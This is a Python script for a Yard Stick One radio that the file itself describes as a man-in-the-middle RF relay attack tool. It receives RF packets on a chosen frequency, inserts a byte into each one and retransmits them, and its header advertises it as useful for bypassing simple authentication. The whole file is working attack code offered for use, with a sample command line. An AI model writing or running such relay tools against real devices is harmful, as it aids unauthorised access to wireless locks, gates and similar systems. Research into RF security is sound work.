import sys
import time
import argparse
from rflib import *

# -------------------------------------------
# Yard Stick One Man-in-the-Middle (MitM) RF Relay
# -------------------------------------------
# Features:
# - Captures legitimate RF signals, modifies payloads, and retransmits them.
# - Useful for bypassing simple authentication mechanisms.
# - Configurable frequency, power, and modulation settings.
#
# Requirements:
# - Yard Stick One (YardStickOne) hardware
# - RfCat Python library
# - Python 3.x
#
# Usage:
# python yardstick_mitm_relay.py --freq 433920000 --power 10 --modulation OOK
# -------------------------------------------

def configure_device(d, frequency, power, modulation):
    """Configures the Yard Stick One device for RX and TX."""
    d.setModeRX()
    d.setFreq(frequency)
    d.setMaxPower() if power == 10 else d.setPower(power)
    
    modulations = {
        "OOK": MOD_ASK_OOK,
        "FSK": MOD_FSK,
        "ASK": MOD_ASK_OOK
    }
    
    if modulation in modulations:
        d.setMdmModulation(modulations[modulation])
    else:
        print(f"[!] Invalid modulation type: {modulation}. Defaulting to OOK.")
        d.setMdmModulation(MOD_ASK_OOK)
    
    d.setMdmDRate(4800)  # Default baud rate
    print(f"[*] Configured: Frequency {frequency / 1e6} MHz, Power {power}, Modulation {modulation}")

def mitm_relay(d):
    """Performs Man-in-the-Middle (MitM) RF relay attack."""
    print("[+] Starting RF MitM relay mode...")
    try:
        while True:
            packet = d.RFrecv(timeout=5000)
            if packet:
                modified_packet = packet.hex()[:6] + "FF" + packet.hex()[6:]  # Modify payload slightly
                print(f"[+] Captured and modified packet: {modified_packet}")
                d.setModeTX()
                d.RFxmit(bytes.fromhex(modified_packet))
                d.setModeRX()
    except KeyboardInterrupt:
        print("[!] MitM mode stopped.")

def main():
    parser = argparse.ArgumentParser(description="Yard Stick One Man-in-the-Middle (MitM) RF Relay")
    parser.add_argument("--freq", type=int, required=True, help="Transmission frequency in Hz")
    parser.add_argument("--power", type=int, default=10, help="Transmission power level (default: 10)")
    parser.add_argument("--modulation", type=str, choices=["OOK", "FSK", "ASK"], default="OOK", help="Modulation type (default: OOK)")
    args = parser.parse_args()

    try:
        d = RfCat()
        configure_device(d, args.freq, args.power, args.modulation)
        mitm_relay(d)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        d.setModeIDLE()
        d.cleanup()

if __name__ == "__main__":
    main()
